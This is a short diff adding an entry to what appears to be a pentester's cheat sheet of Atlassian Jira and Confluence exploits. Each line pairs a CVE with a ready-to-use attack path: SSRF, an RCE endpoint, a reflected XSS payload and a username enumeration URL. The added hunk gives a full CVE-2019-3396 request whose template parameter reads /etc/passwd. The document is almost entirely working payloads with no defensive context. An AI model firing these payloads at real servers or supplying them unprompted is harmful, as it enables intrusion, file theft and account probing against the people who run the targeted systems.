@@ -6,6 +6,10 @@ CVE-2019-8451 SSRF: /plugins/servlet/gadgets/makeRequest?url=https://victimhost:
 >>==============================<<
 CVE-2019–11581: RCE: /secure/ContactAdministrators!default.jspa
 >>==============================<<
+CVE-2019-3396 RCE: POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: JIRA ...
+
+{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
+>>==============================<<
 CVE-2018-20824 XSS: /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
 >>==============================<<
 CVE-2020-14181 Enumeração de usuários: /ViewUserHover.jspa?username=Admin
